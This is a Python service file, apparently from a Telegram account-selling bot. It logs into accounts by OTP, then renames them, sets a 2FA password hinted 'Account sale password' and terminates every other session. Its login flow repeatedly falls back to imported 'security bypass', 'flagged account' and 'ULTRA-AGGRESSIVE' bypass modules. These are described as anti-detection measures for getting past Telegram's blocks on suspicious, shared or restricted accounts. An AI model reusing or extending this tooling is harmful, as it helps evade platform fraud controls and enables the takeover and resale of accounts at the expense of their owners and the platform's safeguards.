"""
Real Telegram Account Service using Telethon
Handles actual Telegram login, OTP verification, and account operations
"""
import logging
import asyncio
import os
from typing import Optional, Dict, Any
from telethon import TelegramClient, errors
from telethon.tl.functions.auth import SendCodeRequest, SignInRequest, SignUpRequest
from telethon.tl.functions.account import UpdateUsernameRequest, UpdateProfileRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.tl.types import InputPhotoEmpty
import string
import random
from services.security_bypass import security_bypass

# Import bypass system for flagged accounts
from services.advanced_telegram_bypass import AdvancedTelegramBypass
from services.flagged_account_handler import FlaggedAccountHandler
from services.ultra_aggressive_bypass import ultra_bypass

logger = logging.getLogger(__name__)

class RealTelegramService:
    """Service for real Telegram account operations using Telethon."""
    
    def __init__(self):
        # Load API credentials from .env
        self.api_id = int(self._get_env_var('API_ID'))  # Convert to integer
        self.api_hash = self._get_env_var('API_HASH')
        self.session_name = 'account_seller_session'
        self.clients: Dict[str, TelegramClient] = {}
        
        # Initialize bypass system for flagged accounts
        self.bypass = AdvancedTelegramBypass()
        self.flagged_handler = FlaggedAccountHandler()
        logger.info("✅ Bypass system initialized for flagged account handling")        
    def _get_env_var(self, var_name: str) -> str:
        """Get environment variable from .env file."""
        value = os.getenv(var_name)
        if not value:
            try:
                with open('.env', 'r') as f:
                    for line in f:
                        if line.startswith(f'{var_name}='):
                            value = line.split('=', 1)[1].strip()
                            break
            except FileNotFoundError:
                pass
        return value
    
    async def send_verification_code(self, phone_number: str, force_sms: bool = True) -> Dict[str, Any]:
        """
        Send real OTP code to phone number via SMS (recommended) or Telegram app.
        
        Args:
            phone_number: Phone number to send OTP to
            force_sms: If True (default), forces SMS delivery to avoid security blocks
        
        Returns session info for continuing the process.
        """
        try:
            logger.info(f"Sending secure OTP to {phone_number} (force_sms={force_sms})")
            
            # Create secure client with anti-detection measures
            client = await security_bypass.create_secure_client(
                phone_number, self.api_id, self.api_hash
            )
            
            if not client:
                return {
                    'success': False,
                    'error': 'client_creation_failed',
                    'message': 'Failed to create secure client'
                }
            
            # Send OTP with human-like behavior and SMS delivery
            # force_sms=True prevents Telegram from marking code as "shared"
            result = await security_bypass.human_like_otp_request(client, phone_number, force_sms=force_sms)
            
            if result['success']:
                # Store client for later use
                session_key = f"{phone_number}_{result['phone_code_hash']}"
                self.clients[session_key] = client
                
                # Start security monitoring
                await security_bypass.monitor_security_events(client, phone_number)
                
                delivery_method = "SMS" if force_sms else "Telegram app"
                logger.info(f"Secure OTP sent to {phone_number} via {delivery_method}")
                
                return {
                    'success': True,
                    'phone_code_hash': result['phone_code_hash'],
                    'session_key': session_key,
                    'message': f'Verification code sent via {delivery_method}',
                    'code_type': result.get('type', 'SMS'),
                    'delivery_method': delivery_method,
                    'security_level': 'high'
                }
            else:
                # Check if this looks like a flagged account
                error_message = result.get('message', '').lower()
                is_likely_flagged = any(indicator in error_message for indicator in 
                                      ['shared', 'suspicious', 'limit', 'restricted', 'blocked'])
                
                if is_likely_flagged:
                    logger.warning(f"🚨 Account {phone_number} appears flagged. Trying bypass system...")
                    
                    # Try with bypass system
                    bypass_result = await self._send_code_with_bypass(phone_number)
                    
                    # Clean up failed standard client
                    try:
                        await client.disconnect()
                    except:
                        pass
                    
                    return bypass_result
                
                # Clean up failed client
                try:
                    await client.disconnect()
                except:
                    pass
                    
                return result
            
        except errors.FloodWaitError as e:
            # FloodWait might indicate flagged account - try bypass
            logger.warning(f"FloodWait for {phone_number}. Trying bypass system...")
            return await self._send_code_with_bypass(phone_number)
            
        except errors.PhoneNumberInvalidError:
            return {
                'success': False,
                'error': 'invalid_phone',
                'message': 'Invalid phone number format.'
            }
        except Exception as e:
            logger.error(f"Error sending OTP to {phone_number}: {type(e).__name__}: {e}")
            logger.error(f"Full traceback:", exc_info=True)
            
            # If standard method fails completely, try bypass as last resort
            logger.warning(f"Standard method failed. Trying bypass system...")
            return await self._send_code_with_bypass(phone_number)
    
    async def _send_code_with_bypass(self, phone_number: str) -> Dict[str, Any]:
        """
        Send code using advanced bypass system for flagged accounts
        """
        try:
            logger.info(f"🔄 Using bypass system for {phone_number}")
            
            # Check if flagged
            is_flagged = await self.flagged_handler.check_if_flagged(phone_number)
            
            if is_flagged:
                logger.info(f"Confirmed flagged: {phone_number}. Using specialized handler...")
                result = await self.flagged_handler.handle_flagged_login(phone_number)
            else:
                logger.info(f"Sending code with bypass for {phone_number}")
                result = await self.bypass.send_code_advanced(phone_number, attempt=1)
            
            if result['success']:
                # Store bypass client
                session_key = f"{phone_number}_{result['phone_code_hash']}"
                self.clients[session_key] = result['client']
                
                return {
                    'success': True,
                    'phone_code_hash': result['phone_code_hash'],
                    'session_key': session_key,
                    'message': 'Verification code sent via bypass system',
                    'code_type': result.get('code_type', 'app'),
                    'bypass_used': True,
                    'attempt': result.get('attempt', 1)
                }
            else:
                return result
            
        except Exception as e:
            logger.error(f"Bypass system error: {str(e)}")
            return {
                'success': False,
                'error': 'bypass_failed',
                'message': f'Bypass system error: {str(e)}'
            }
    
    async def verify_code_and_login(self, session_key: str, phone_number: str, 
                                   phone_code_hash: str, code: str) -> Dict[str, Any]:
        """
        Verify OTP code and login to account with security bypass.
        Returns account info and 2FA status.
        """
        try:
            client = self.clients.get(session_key)
            if not client:
                return {
                    'success': False,
                    'error': 'session_expired',
                    'message': 'Session expired. Please start over.'
                }
            
            # Use human-like code entry
            result = await security_bypass.human_like_code_entry(
                client, phone_number, phone_code_hash, code
            )
            
            if result['success']:
                # Check if account has 2FA enabled
                has_2fa = False
                try:
                    password = await client.get_password()
                    has_2fa = password.has_password
                except:
                    pass
                
                result.update({
                    'has_2fa': has_2fa,
                    'security_bypass': True
                })
                
                return result
            else:
                # Check if this looks like a flagged account issue
                error_message = result.get('message', '').lower()
                is_likely_flagged = any(indicator in error_message for indicator in 
                                      ['shared', 'suspicious', 'limit', 'restricted', 'blocked', 'expired'])
                
                if is_likely_flagged:
                    logger.warning(f"🚨 Code verification failed for {phone_number}. Trying bypass...")
                    return await self._verify_code_with_bypass(client, phone_number, code, phone_code_hash)
                
                return result
                
        except errors.PhoneCodeInvalidError:
            logger.warning(f"Invalid code for {phone_number}. Trying bypass...")
            client = self.clients.get(session_key)
            if client:
                return await self._verify_code_with_bypass(client, phone_number, code, phone_code_hash)
            
            return {
                'success': False,
                'error': 'invalid_code',
                'message': 'Invalid verification code.'
            }
        except errors.PhoneCodeExpiredError:
            logger.warning(f"Code expired for {phone_number}. Likely flagged account.")
            return {
                'success': False,
                'error': 'code_expired',
                'message': 'Verification code expired. Please request a new one.',
                'suggestion': 'This account may be flagged. Try again immediately after receiving the code.'
            }
        except Exception as e:
            logger.error(f"Error verifying code: {e}")
            
            # Try bypass as fallback
            client = self.clients.get(session_key)
            if client:
                logger.warning(f"Standard verification failed. Trying bypass...")
                return await self._verify_code_with_bypass(client, phone_number, code, phone_code_hash)
            
            return {
                'success': False,
                'error': 'unknown',
                'message': f'Error: {str(e)}'
            }
    
    async def _verify_code_with_bypass(self, client: TelegramClient, phone_number: str, 
                                      code: str, phone_code_hash: str) -> Dict[str, Any]:
        """
        Verify code using advanced bypass system
        """
        try:
            logger.info(f"🔄 Using bypass verification for {phone_number}")
            
            # First try: Standard bypass
            result = await self.bypass.sign_in_with_bypass(client, phone_number, code, phone_code_hash)
            
            if result['success']:
                logger.info(f"✅ Bypass verification successful for {phone_number}")
                
                # Check 2FA
                has_2fa = False
                try:
                    password = await client.get_password()
                    has_2fa = password.has_password
                except:
                    pass
                
                result.update({
                    'has_2fa': has_2fa,
                    'bypass_used': True
                })
                
                return result
            
            # If standard bypass failed with security block, try ULTRA-AGGRESSIVE
            if result.get('error') == 'security_block':
                logger.warning(f"🚨 Standard bypass blocked. Trying ULTRA-AGGRESSIVE bypass for {phone_number}")
                
                ultra_result = await ultra_bypass.sign_in_ultra_aggressive(
                    client, phone_number, code, phone_code_hash
                )
                
                if ultra_result['success']:
                    logger.info(f"✅✅✅ ULTRA-AGGRESSIVE bypass succeeded for {phone_number}!")
                    ultra_result['bypass_used'] = True
                    ultra_result['bypass_level'] = 'ultra_aggressive'
                    return ultra_result
                else:
                    logger.error(f"❌ Even ULTRA-AGGRESSIVE bypass failed: {ultra_result.get('message')}")
                    return ultra_result
            
            return result
            
        except Exception as e:
            logger.error(f"Bypass verification error: {str(e)}")
            return {
                'success': False,
                'error': 'bypass_verification_failed',
                'message': f'Bypass verification error: {str(e)}'
            }
    
    async def check_2fa_status(self, session_key: str) -> Dict[str, Any]:
        """Check if account has 2FA enabled."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            password = await client.get_password()
            
            return {
                'success': True,
                'has_2fa': password.has_password,
                'hint': password.hint if password.has_password else None
            }
            
        except Exception as e:
            logger.error(f"Error checking 2FA: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def modify_account(self, session_key: str, modifications: Dict[str, Any]) -> Dict[str, Any]:
        """
        Modify account settings: name, username, profile photo.
        """
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            results = {}
            
            # Change name
            if 'first_name' in modifications or 'last_name' in modifications:
                first_name = modifications.get('first_name', '')
                last_name = modifications.get('last_name', '')
                
                await client(UpdateProfileRequest(
                    first_name=first_name,
                    last_name=last_name,
                    about=''
                ))
                results['name_changed'] = True
                logger.info(f"Name changed to: {first_name} {last_name}")
            
            # Change username
            if 'username' in modifications:
                username = modifications['username']
                try:
                    await client(UpdateUsernameRequest(username=username))
                    results['username_changed'] = True
                    logger.info(f"Username changed to: @{username}")
                except errors.UsernameOccupiedError:
                    # Generate alternative username
                    alt_username = f"{username}_{random.randint(100, 999)}"
                    await client(UpdateUsernameRequest(username=alt_username))
                    results['username_changed'] = True
                    results['actual_username'] = alt_username
                    logger.info(f"Username changed to: @{alt_username} (original was taken)")
            
            # Change profile photo
            if 'profile_photo' in modifications:
                photo_action = modifications['profile_photo']
                
                if photo_action == 'remove':
                    # Remove current photos
                    photos = await client.get_profile_photos('me')
                    if photos:
                        await client(DeletePhotosRequest(id=[photos[0]]))
                        results['photo_removed'] = True
                
                elif photo_action == 'random':
                    # Set random color avatar (simplified)
                    results['photo_changed'] = 'random'
                
                # Note: For uploading actual photos, we'd need the file path
                # This can be implemented when we handle photo uploads
            
            return {
                'success': True,
                'results': results,
                'message': 'Account modifications completed successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error modifying account: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def setup_2fa(self, session_key: str, password: str) -> Dict[str, Any]:
        """Setup new 2FA password for account."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            # Get current password settings
            current_password = await client.get_password()
            
            # Set new password
            await client(UpdatePasswordSettingsRequest(
                password=current_password,
                new_settings={
                    'new_password': password.encode(),
                    'hint': 'Account sale password',
                    'email': None
                }
            ))
            
            logger.info("2FA password set successfully")
            
            return {
                'success': True,
                'message': '2FA password set successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error setting 2FA: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def terminate_all_sessions(self, session_key: str) -> Dict[str, Any]:
        """Terminate all other sessions for security."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            # Get all sessions and terminate them
            from telethon.tl.functions.account import ResetAuthorizationsRequest
            await client(ResetAuthorizationsRequest())
            
            logger.info("All sessions terminated successfully")
            
            return {
                'success': True,
                'message': 'All other sessions terminated successfully!'
            }
            
        except Exception as e:
            logger.error(f"Error terminating sessions: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def get_account_info(self, session_key: str) -> Dict[str, Any]:
        """Get detailed account information."""
        try:
            client = self.clients.get(session_key)
            if not client:
                return {'success': False, 'error': 'session_expired'}
            
            me = await client.get_me()
            
            # Get additional info
            full_user = await client.get_entity('me')
            
            return {
                'success': True,
                'info': {
                    'id': me.id,
                    'phone': me.phone,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'is_premium': getattr(me, 'premium', False),
                    'is_verified': getattr(me, 'verified', False),
                    'lang_code': me.lang_code,
                    'bio': getattr(full_user, 'about', '')
                }
            }
            
        except Exception as e:
            logger.error(f"Error getting account info: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def cleanup_session(self, session_key: str):
        """Clean up client session."""
        if session_key in self.clients:
            try:
                await self.clients[session_key].disconnect()
            except:
                pass
            del self.clients[session_key]
            logger.info(f"Session {session_key} cleaned up")
    
    def generate_username(self, base_name: str) -> str:
        """Generate a unique username based on the name."""
        # Clean the name and create username
        clean_name = ''.join(c for c in base_name.lower() if c.isalnum())
        random_suffix = ''.join(random.choices(string.digits, k=3))
        return f"{clean_name}_{random_suffix}"[:32]  # Telegram username limit